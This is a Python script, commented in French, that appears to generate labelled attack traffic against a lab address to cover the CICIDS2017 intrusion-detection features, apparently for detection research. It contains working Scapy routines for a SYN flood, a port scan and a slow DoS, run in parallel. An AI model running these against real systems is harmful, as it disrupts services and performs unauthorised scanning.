# comprehensive_attacks.py
from scapy.all import *
import threading
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor

def generate_all_features_traffic(target_ip="172.20.0.10"):
    """Génère du trafic pour couvrir les 78 features CICIDS2017"""
    
    print("🎯 GÉNÉRATION DE TRAFIC POUR 78 FEATURES...")
    
    def tcp_different_flags_and_sizes():
        """Génère TCP avec différents flags et tailles pour varier les features"""
        print("🔄 TCP - Flags et tailles variées")
        flags_list = ['S', 'A', 'SA', 'FA', 'PA', 'RA', 'FPA']
        sizes = [64, 128, 512, 1024, 1460]
        
        for flag in flags_list:
            for size in sizes:
                for _ in range(8):
                    sport = random.randint(1024, 65535)
                    payload = "X" * size if size > 0 else ""
                    packet = IP(dst=target_ip)/TCP(sport=sport, dport=80, flags=flag)
                    if payload:
                        packet = packet/Raw(load=payload)
                    send(packet, verbose=0)
                    time.sleep(0.05)
    
    def udp_various_ports_and_sizes():
        """Génère UDP sur différents ports avec différentes tailles"""
        print("📡 UDP - Ports et tailles variés")
        ports = [53, 123, 161, 500, 1900, 4500]
        sizes = [32, 64, 128, 256, 512, 1024]
        
        for port in ports:
            for size in sizes:
                for _ in range(6):
                    sport = random.randint(1024, 65535)
                    payload = "Y" * size
                    send(IP(dst=target_ip)/UDP(sport=sport, dport=port)/payload, verbose=0)
                    time.sleep(0.03)
    
    def syn_flood_intense():
        """SYN Flood pour Flow Duration et Packet Count features"""
        print("🌊 SYN Flood intense")
        for i in range(1000):
            sport = random.randint(1024, 65535)
            dport = random.choice([80, 443, 22, 21])
            send(IP(dst=target_ip)/TCP(sport=sport, dport=dport, flags="S"), verbose=0)
            if i % 100 == 0:
                time.sleep(0.1)
    
    def port_scan_comprehensive():
        """Scan complet de ports pour reconnaissance"""
        print("🔍 Scan de ports complet")
        # Scan TCP SYN
        for port in range(20, 100):
            send(IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=port, flags="S"), verbose=0)
            time.sleep(0.01)
        
        # Scan TCP ACK
        for port in [80, 443, 22, 21, 25, 53]:
            send(IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=port, flags="A"), verbose=0)
            time.sleep(0.05)
    
    def http_traffic_various():
        """Trafic HTTP varié"""
        print("🌐 Trafic HTTP varié")
        urls = [
            f"http://{target_ip}/",
            f"http://{target_ip}/test",
            f"http://{target_ip}/admin",
            f"http://{target_ip}/images"
        ]
        
        for url in urls:
            for _ in range(10):
                try:
                    requests.get(url, timeout=1)
                    time.sleep(random.uniform(0.5, 2))
                except:
                    pass
    
    def mixed_protocol_traffic():
        """Mélange de protocoles"""
        print("🔄 Trafic multi-protocoles")
        
        # ICMP varié
        for i in range(20):
            send(IP(dst=target_ip)/ICMP(), verbose=0)
            time.sleep(0.1)
        
        # TCP avec PSH et URG flags (rares)
        for _ in range(15):
            sport = random.randint(1024, 65535)
            send(IP(dst=target_ip)/TCP(sport=sport, dport=80, flags="PA"), verbose=0)
            time.sleep(0.1)
    
    def slow_dos_attack():
        """Attaque lente pour IAT features"""
        print("🐌 Attaque lente (IAT features)")
        for i in range(200):
            sport = random.randint(1024, 65535)
            send(IP(dst=target_ip)/TCP(sport=sport, dport=80, flags="S"), verbose=0)
            time.sleep(random.uniform(0.1, 1.0))  # IAT variés
    
    # Lancer toutes les attaques en parallèle
    attacks = [
        tcp_different_flags_and_sizes,
        udp_various_ports_and_sizes, 
        syn_flood_intense,
        port_scan_comprehensive,
        http_traffic_various,
        mixed_protocol_traffic,
        slow_dos_attack
    ]
    
    print("🚀 Lancement de toutes les attaques en parallèle...")
    with ThreadPoolExecutor(max_workers=7) as executor:
        futures = [executor.submit(attack) for attack in attacks]
        
        # Attendre la fin
        for future in futures:
            try:
                future.result(timeout=120)
            except:
                continue
    
    print("✅ GÉNÉRATION TERMINÉE!")

if __name__ == "__main__":
    generate_all_features_traffic()